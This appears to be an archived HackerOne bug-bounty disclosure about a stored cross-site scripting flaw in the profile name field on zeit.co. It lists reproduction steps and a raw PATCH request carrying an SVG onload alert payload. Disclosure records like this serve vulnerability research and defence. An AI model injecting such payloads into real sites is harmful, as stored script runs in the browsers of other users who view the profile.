@@ -1,0 +1,35 @@
+ReportLink:https://hackerone.com/reports/541853
+WeaknessName:Cross-site Scripting (XSS) - Stored
+Reporter:https://hackerone.com/sohelahmed786
+ReportedTo:ZEIT(zeit)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:16.05.2019 19:53:02
+
+Summary:
+
+## Summary:
+There is a stored XSS vulnerability in the users profile page.
+
+## Steps To Reproduce:
+1. Go to https://zeit.co/login and login.
+2. Go to https://zeit.co/profile/{username}/edit
+3. Enter any value in the field which shows name
+4. Intercept it burp and send it to repeater.
+5. Then change the name value and post it.: - The url will be like
+```PATCH /api/www/user HTTP/1.1
+Host: zeit.co
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Referer: https://zeit.co/
+Origin: https://zeit.co
+Content-Length: 35
+Connection: close
+{"name":"<svg/onload = alert(2);>"}```
+6. Now every time the user refreshes the page the xss triggers.
+
+## Impact
+
+if someone views attacker profile the script will execute and cause trouble.
